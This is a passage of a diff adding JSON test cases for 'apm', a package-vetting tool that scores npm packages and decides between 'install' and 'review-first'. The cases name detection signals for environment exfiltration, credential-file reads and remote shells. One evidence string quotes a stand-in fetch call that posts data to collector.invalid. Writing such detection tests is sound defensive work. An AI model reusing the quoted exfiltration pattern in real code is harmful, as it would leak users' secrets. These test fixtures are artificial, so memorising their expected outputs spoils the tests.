+      "name": "agent-native: install scripts that only build are a note, not a hold (@swc/core at 75)",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 75,
+        "lost": [
+          {
+            "id": "install-shell",
+            "label": "Starts a process at install",
+            "points": -15
+          },
+          {
+            "id": "install-script",
+            "label": "Has an install script",
+            "points": -10
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "install",
+        "commands": true,
+        "summary": "x@1.0.0 passes apm's checks: it scores 75/100 (B), is past the 24-hour cooldown, nothing in its dependency tree was refused or flagged, and apm scored every dependency.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "agent-native: an incomplete analysis with a risk signal in what apm read is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 0,
+        "lost": [
+          {
+            "id": "incomplete",
+            "label": "Some code that runs was too large to analyze",
+            "points": -61,
+            "evidence": [
+              "lib/big.js: too large"
+            ]
+          },
+          {
+            "id": "exfiltration",
+            "label": "Sends the whole environment in a request",
+            "points": -61
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm found a risk signal in it: Sends the whole environment in a request. It passes apm's install policy and scores 0/100 (C).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [],
+        "reasons": [
+          "Some code that runs was too large to analyze (-61 points).",
+          "Sends the whole environment in a request (-61 points)."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: an incomplete analysis under the floor only for what apm could not read is review-first (typescript's platform packages at 9)",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 9,
+        "lost": [
+          {
+            "id": "incomplete",
+            "label": "Some code that runs was too large to analyze",
+            "points": -61,
+            "evidence": [
+              "lib/tsc: past the 4.0 MB analysis budget"
+            ]
+          },
+          {
+            "id": "unanalyzed-files",
+            "label": "Some files were not analyzed",
+            "points": -20
+          },
+          {
+            "id": "new-publisher",
+            "label": "Published by an account that never published this package before",
+            "points": -10
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 9/100 (C)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [],
+        "reasons": [
+          "apm could not fully analyse it: `lib/tsc: past the 4.0 MB analysis budget`.",
+          "Some code that runs was too large to analyze (-61 points)."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: an incomplete analysis clamped at 0 is review-first for what apm did not finish",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 0,
+        "lost": [
+          {
+            "id": "incomplete",
+            "label": "Some code that runs was too large to analyze",
+            "points": -61
+          },
+          {
+            "id": "risky-dependency",
+            "label": "A dependency scores under the floor",
+            "points": -30
+          },
+          {
+            "id": "undeclared-capability",
+            "label": "Uses capabilities it does not declare",
+            "points": -20
+          },
+          {
+            "id": "credential-mention",
+            "label": "Names a credential file next to a read",
+            "points": -10
+          },
+          {
+            "id": "new-publisher",
+            "label": "Published by an account that never published this package before",
+            "points": -10
+          },
+          {
+            "id": "deprecated",
+            "label": "Deprecated",
+            "points": -5
+          },
+          {
+            "id": "new-dependency",
+            "label": "New dependencies",
+            "points": -5
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm could not fully analyse it (it scores 0/100 (C)). It passes apm's install policy.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [],
+        "reasons": [
+          "apm could not fully analyse it, and its analysis does not record that the only gap is files left unread for their size.",
+          "Some code that runs was too large to analyze (-61 points)."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: a dependency apm could not fully analyse, from an older registry with no signals, is review-first (typescript's live answer)",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 90,
+        "lost": [
+          {
+            "id": "new-publisher",
+            "label": "Published by an account that never published this package before",
+            "points": -10
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "@typescript/typescript-darwin-arm64",
+            "version": "7.0.2",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "incomplete",
+            "text": "apm could not fully analyse it (scores 9/100, F)",
+            "score": 9
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm could not fully analyse or score. It passes apm's install policy and scores 90/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [],
+        "reasons": [
+          "apm could not fully analyse or score 1 dependency: `@typescript/typescript-darwin-arm64@7.0.2: apm could not fully analyse it (scores 9/100, F)`.",
+          "Published by an account that never published this package before (-10 points)."
+        ]
+      }
+    },
+    {
+      "name": "fail-closed: a dependency apm could not fully analyse with only gaps in its signals is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "dep",
+            "version": "2.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "incomplete",
+            "text": "apm could not fully analyse it (scores 9/100, F)",
+            "score": 9,
+            "signals": [
+              {
+                "id": "incomplete",
+                "points": -61
+              },
+              {
+                "id": "unanalyzed-files",
+                "points": -20
+              },
+              {
+                "id": "new-publisher",
+                "points": -10
+              }
+            ]
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm could not fully analyse or score. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [],
+        "reasons": [
+          "apm could not fully analyse or score 1 dependency: `dep@2.0.0: apm could not fully analyse it (scores 9/100, F)`.",
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "agent-native: a dependency apm could not fully analyse with a risk signal in what it read is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "dep",
+            "version": "2.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "incomplete",
+            "text": "apm could not fully analyse it (scores 0/100, F)",
+            "score": 0,
+            "signals": [
+              {
+                "id": "incomplete",
+                "points": -61
+              },
+              {
+                "id": "remote-shell",
+                "points": -61
+              }
+            ]
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm flagged for a risk signal or a score under 40. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "fail-closed: a dependency under the floor only for what apm could not read is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "dep",
+            "version": "2.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "low-score",
+            "text": "scores 35/100 (F), under the floor of 40",
+            "score": 35,
+            "signals": [
+              {
+                "id": "risky-dependency",
+                "points": -30
+              },
+              {
+                "id": "unanalyzed-files",
+                "points": -20
+              },
+              {
+                "id": "new-publisher",
+                "points": -10
+              },
+              {
+                "id": "deprecated",
+                "points": -5
+              }
+            ]
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm flagged for a risk signal or a score under 40. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [],
+        "reasons": [
+          "apm flagged 1 dependency for a risk: `dep@2.0.0: scores 35/100 (F), under the floor of 40`.",
+          "The AI review found nothing in the files it read."
+        ]
+      }
+    },
+    {
+      "name": "agent-native: a dependency inside the cooldown that apm scored and found no risk in is a note",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "@tybys/wasm-util",
+            "version": "0.10.5",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "cooldown",
+            "text": "published 8 hours ago, inside apm's 24-hour cooldown",
+            "signals": [
+              {
+                "id": "encoded-data",
+                "points": -2
+              }
+            ]
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "install",
+        "commands": true,
+        "summary": "Install x@1.0.0: it scores 100/100 (A) and nothing apm found needs a person to look first, but some of its dependencies were published inside apm's 24-hour cooldown.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [
+          {
+            "kind": "dependency-cooldown",
+            "text": "1 dependency was published inside apm's 24-hour cooldown; apm scored it and found no risk: `@tybys/wasm-util@0.10.5: published 8 hours ago, inside apm's 24-hour cooldown`."
+          }
+        ]
+      }
+    },
+    {
+      "name": "agent-native: a dependency inside the cooldown with a risk signal is review-first (debug 4.4.2's obfuscated payload)",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "debug",
+            "version": "4.4.2",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "cooldown",
+            "text": "published 2 hours ago, inside apm's 24-hour cooldown",
+            "signals": [
+              {
+                "id": "obfuscated",
+                "points": -20
+              },
+              {
+                "id": "suspicious-combination",
+                "points": -15
+              }
+            ]
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm flagged for a risk signal or a score under 40. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "agent-native: a dependency inside the cooldown that is still being analysed is review-first, once",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "dep",
+            "version": "2.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "cooldown",
+            "text": "published 1 hour ago, inside apm's 24-hour cooldown"
+          },
+          {
+            "name": "dep",
+            "version": "2.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "pending",
+            "text": "not scored yet: still being analysed after the registry's wait"
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency published inside apm's 24-hour cooldown with no score apm could check. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [
+          {
+            "kind": "dependency-gaps",
+            "text": "apm could not fully check 1 dependency: `dep@2.0.0: not scored yet: still being analysed after the registry's wait`."
+          }
+        ]
+      }
+    },
+    {
+      "name": "agent-native: a dependency still being analysed past the cooldown is a note",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "dep",
+            "version": "2.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "pending",
+            "text": "not scored yet: still being analysed after the registry's wait"
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "install",
+        "commands": true,
+        "summary": "Install x@1.0.0: it scores 100/100 (A) and nothing apm found needs a person to look first, but apm could not fully check some of its dependencies.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [
+          {
+            "kind": "dependency-gaps",
+            "text": "apm could not fully check 1 dependency: `dep@2.0.0: not scored yet: still being analysed after the registry's wait`."
+          }
+        ]
+      }
+    },
+    {
+      "name": "agent-native: dependencies apm cannot score for size are a note (next's platform binaries)",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "@next/swc-linux-x64-gnu",
+            "version": "16.4.6",
+            "via": [
+              "x@1.0.0"
+            ],
+            "kind": "unscorable",
+            "text": "apm cannot score this version: it is too large for apm to analyze",
+            "unscorable": "too-large"
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "install",
+        "commands": true,
+        "summary": "Install x@1.0.0: it scores 100/100 (A) and nothing apm found needs a person to look first, but apm could not fully check some of its dependencies.",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [
+          {
+            "kind": "dependency-gaps",
+            "text": "apm could not fully check 1 dependency: `@next/swc-linux-x64-gnu@16.4.6: apm cannot score this version: it is too large for apm to analyze`."
+          }
+        ]
+      }
+    },
+    {
+      "name": "agent-native: an older version picked past the cooldown installs, and the note names the fresh one",
+      "resolve": {
+        "kind": "ok",
+        "version": "4.13.18",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "older": {
+          "kind": "picked",
+          "passedOver": [
+            {
+              "version": "4.13.19",
+              "text": "published 2 hours ago, inside apm's 24-hour cooldown"
+            }
+          ]
+        }
+      },
+      "review": {
+        "kind": "not-reviewed"
+      },
+      "expect": {
+        "verdict": "install",
+        "commands": true,
+        "summary": "Install x@4.13.18: it scores 100/100 (A) and nothing apm found needs a person to look first, but it is not the newest version: that one is inside apm's 24-hour cooldown. No AI review: apm never picked this version for one.",
+        "coverage": {
+          "aiReview": "not-selected",
+          "dependencies": "complete"
+        },
+        "notes": [
+          {
+            "kind": "older-version",
+            "text": "apm picked x@4.13.18, the newest version in range past its 24-hour cooldown. Newer, inside it: `x@4.13.19: published 2 hours ago, inside apm's 24-hour cooldown`."
+          },
+          {
+            "kind": "no-ai-review",
+            "text": "No AI review of this version."
+          }
+        ]
+      }
+    },
+    {
+      "name": "agent-native: when every version explain looked at is inside the cooldown it is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "x",
+            "version": "1.0.0",
+            "kind": "cooldown",
+            "text": "published 1 hour ago, inside apm's 24-hour cooldown",
+            "via": []
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "older": {
+          "kind": "gave-up",
+          "looked": 3
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it and the 2 versions before it in range were all published inside apm's 24-hour cooldown, so it has had little time to be looked at. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "agent-native: a brand-new package with no version past the cooldown is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [
+          {
+            "name": "x",
+            "version": "1.0.0",
+            "kind": "cooldown",
+            "text": "published 3 hours ago, inside apm's 24-hour cooldown",
+            "via": []
+          }
+        ],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "older": {
+          "kind": "none"
+        }
+      },
+      "review": {
+        "kind": "not-reviewed"
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it was published inside apm's 24-hour cooldown and no older version in range is past it, so it has had little time to be looked at. It passes apm's install policy and scores 100/100 (A). No AI review: apm never picked this version for one.",
+        "coverage": {
+          "aiReview": "not-selected",
+          "dependencies": "complete"
+        },
+        "notes": [
+          {
+            "kind": "no-ai-review",
+            "text": "No AI review of this version."
+          }
+        ]
+      }
+    },
+    {
+      "name": "agent-native: several notes: the summary names the first and counts the rest",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 90,
+        "lost": [
+          {
+            "id": "new-publisher",
+            "label": "Published by an account that never published this package before",
+            "points": -10
+          }
+        ],
+        "skipped": [],
+        "unchecked": 1,
+        "uncheckedDeps": [
+          {
+            "dependency": "git-dep@github:a/b",
+            "reason": "a git dependency"
+          }
+        ],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [
+            {
+              "name": "slow",
+              "version": "1.0.0"
+            }
+          ],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "queued"
+      },
+      "expect": {
+        "verdict": "install",
+        "commands": true,
+        "summary": "Install x@1.0.0: it scores 90/100 (A) and nothing apm found needs a person to look first, but its AI review has not finished, and 2 more notes.",
+        "coverage": {
+          "aiReview": "in-progress",
+          "dependencies": "incomplete"
+        },
+        "notes": [
+          {
+            "kind": "ai-review-pending",
+            "text": "The AI review of this version is queued and has not started."
+          },
+          {
+            "kind": "dependency-ai-review",
+            "text": "The AI review of 1 dependency has not finished: `slow@1.0.0`."
+          },
+          {
+            "kind": "dependency-gaps",
+            "text": "1 dependency apm could not score: `git-dep@github:a/b`."
+          }
+        ]
+      }
+    },
+    {
+      "name": "review of abcbb18: a flow cut where it may send the environment is a possible exfiltration beside incomplete, and review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 4,
+        "lost": [
+          {
+            "id": "incomplete",
+            "label": "Some code that runs was too large to analyze, so this version is unverified",
+            "points": -61,
+            "evidence": [
+              "index.js:1: …)))))));fetch('https://collector.invalid/',{method:'POST',… (apm stopped following a value here at a value passed through more than 32 steps; what this call sends may be the whole environment)"
+            ]
+          },
+          {
+            "id": "exfiltration",
+            "label": "May send the environment or a credential file: apm stopped following a value that can carry it into a request",
+            "points": -35,
+            "evidence": [
+              "index.js:1: …)))))));fetch('https://collector.invalid/',{method:'POST',… (apm stopped following a value here at a value passed through more than 32 steps; what this call sends may be the whole environment)"
+            ]
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        }
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm found a risk signal in it: May send the environment or a credential file: apm stopped following a value that can carry it into a request. It passes apm's install policy and scores 4/100 (C).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [],
+        "reasons": [
+          "Some code that runs was too large to analyze, so this version is unverified (-61 points).",
+          "May send the environment or a credential file: apm stopped following a value that can carry it into a request (-35 points)."
+        ]
+      }
+    },
+    {
+      "name": "review of abcbb18: a dependency the registry lists for a credential read at 70, with no warning, is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "risks": [
+          {
+            "name": "review-risk-dep",
+            "version": "1.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "scorer": "apm-score-v10",
+            "score": 70,
+            "signals": [
+              {
+                "id": "credential-read",
+                "points": -30
+              }
+            ]
+          }
+        ]
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm flagged for a risk signal or a score under 40. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [],
+        "reasons": [
+          "apm flagged 1 dependency for a risk: `review-risk-dep@1.0.0: scores 70/100, and apm found: credential-read`."
+        ]
+      }
+    },
+    {
+      "name": "review of abcbb18: a dependency the registry lists for a remote shell at 50 is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "risks": [
+          {
+            "name": "dropper-dep",
+            "version": "2.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "scorer": "apm-score-v10",
+            "score": 50,
+            "signals": [
+              {
+                "id": "remote-shell",
+                "points": -50
+              }
+            ]
+          }
+        ]
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm flagged for a risk signal or a score under 40. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "review of abcbb18: an apm-score-v3 analysis that reads .npmrc and sends it (credential-access at 65) is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 65,
+        "lost": [
+          {
+            "id": "credential-access",
+            "label": "Reads credential files or secret environment variables",
+            "points": -25
+          },
+          {
+            "id": "network",
+            "label": "Makes network requests",
+            "points": -10
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "scorer": "apm-score-v3"
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm found a risk signal in it: Reads credential files or secret environment variables. It passes apm's install policy and scores 65/100 (C).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": [],
+        "reasons": [
+          "Reads credential files or secret environment variables (-25 points)."
+        ]
+      }
+    },
+    {
+      "name": "review of abcbb18: credential-access from a registry that does not say the scorer is read as an earlier scorer's, review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 75,
+        "lost": [
+          {
+            "id": "credential-access",
+            "label": "Reads credential files or secret environment variables",
+            "points": -25
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "scorer": null
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: apm found a risk signal in it: Reads credential files or secret environment variables. It passes apm's install policy and scores 75/100 (B).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "review of abcbb18: a dependency an earlier scorer flagged for credential-access, listed over the floor, is review-first",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 100,
+        "lost": [],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "risks": [
+          {
+            "name": "old-dep",
+            "version": "3.0.0",
+            "via": [
+              "x@1.0.0"
+            ],
+            "scorer": "apm-score-v9",
+            "score": 75,
+            "signals": [
+              {
+                "id": "credential-access",
+                "points": -25
+              }
+            ]
+          }
+        ]
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "review-first",
+        "commands": true,
+        "summary": "Review x@1.0.0 before installing: it brings in 1 dependency apm flagged for a risk signal or a score under 40. It passes apm's install policy and scores 100/100 (A).",
+        "coverage": {
+          "aiReview": "reviewed",
+          "dependencies": "complete"
+        },
+        "notes": []
+      }
+    },
+    {
+      "name": "review of abcbb18: an earlier scorer's capabilities alone (network, eval at 80) still install",
+      "resolve": {
+        "kind": "ok",
+        "version": "1.0.0",
+        "score": 80,
+        "lost": [
+          {
+            "id": "network",
+            "label": "Makes network requests",
+            "points": -10
+          },
+          {
+            "id": "eval",
+            "label": "Uses eval",
+            "points": -10
+          }
+        ],
+        "skipped": [],
+        "unchecked": 0,
+        "uncheckedDeps": [],
+        "warnings": [],
+        "depReviews": {
+          "kind": "on",
+          "confirmed": [],
+          "underReview": [],
+          "pending": [],
+          "noAnswer": []
+        },
+        "scorer": "apm-score-v9"
+      },
+      "review": {
+        "kind": "reviewed",
+        "state": "found-nothing",
+        "findings": 0
+      },
+      "expect": {
+        "verdict": "install",
+        "commands": true,
+        "summary": "x@1.0.0 passes apm's checks: it scores 80/100 (B), is past the 24-hour cooldown, nothing in its dependency tree was refused or flagged, and apm scored every dependency.",
+        "coverage": {
+          "aiReview": "reviewed",
